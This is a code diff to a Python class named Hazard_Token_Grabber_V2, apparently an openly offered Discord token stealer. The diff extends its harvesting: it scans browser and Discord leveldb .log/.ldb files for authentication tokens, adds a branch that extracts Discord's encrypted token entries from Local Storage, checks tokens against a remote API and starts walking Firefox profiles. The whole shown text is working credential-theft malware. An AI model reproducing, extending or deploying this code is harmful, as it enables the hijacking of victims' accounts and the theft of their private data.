@@ -293,20 +293,37 @@ class Hazard_Token_Grabber_V2:
         for source, path in paths.items():
             if not os.path.exists(path):
                 continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (self.regex):
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200:
-                                    if token in self.tokens:
-                                        continue
-                            except Exception:
-                                pass
-                                self.tokens.append(token)
+            if not "discord" in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    if r.status_code == 200:
+                                        if token in self.tokens:
+                                            continue
+                                except Exception:
+                                    pass
+                                    self.tokens.append(token)
+            else:
+                path += "\\Local Storage\\leveldb"
+                for file_name in os.listdir(path):
+                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                        continue
+                    with open(f"{path}\\{file_name}", "r") as f:
+                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                            if "dQw4w9WgXcQ" in line:
+                                x = str(line.encode("utf8")).replace("\\", "")
+                                for i in range(len(x)):
+                                    if x[i:i+len("dQw4w9WgXcQ")] == "dQw4w9WgXcQ":
+                                        y = x[i:i+220]
+                                        for i in range(len(y)):
+                                            if y[i:i+len("\"")] == "\"":
+                                                token = y[:i]
+                                                self.tokens.append(token)
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
